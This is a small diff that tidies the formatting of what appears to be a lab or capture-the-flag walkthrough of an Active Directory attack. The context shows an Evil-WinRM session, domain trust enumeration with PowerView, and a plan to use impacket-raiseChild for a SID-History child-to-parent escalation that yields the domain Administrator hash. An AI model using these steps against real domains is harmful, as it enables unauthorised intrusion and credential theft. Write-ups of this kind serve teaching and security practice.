@@ -258,9 +258,9 @@ Info: Establishing connection to remote endpoint
 
 *Evil-WinRM* PS C:\Users\ldap_svc\Documents>
 ```
-Domain trusts were enumerated
+Domain trusts were enumerated:
 
-```cmd
+```
 PS C:\Users\ldap_svc> . .\powerview.ps1
 PS C:\Users\ldap_svc> Get-DomainTrust
 
@@ -272,6 +272,7 @@ TrustDirection  : Bidirectional
 WhenCreated     : 3/7/2026 1:55:44 AM
 WhenChanged     : 4/21/2026 1:45:13 PM
 ```
+
 Since the child domain `CORP.DARKHAVEN.TECH` and `DARKHAVEN.TECH` has a bidirectional trust, SID-History injection attack can be performed to escalate from the child to the parent domain.
 
 `impacket-raiseChild` automates this attack and retrieves the hash of `darkhaven.tech\Administrator`:
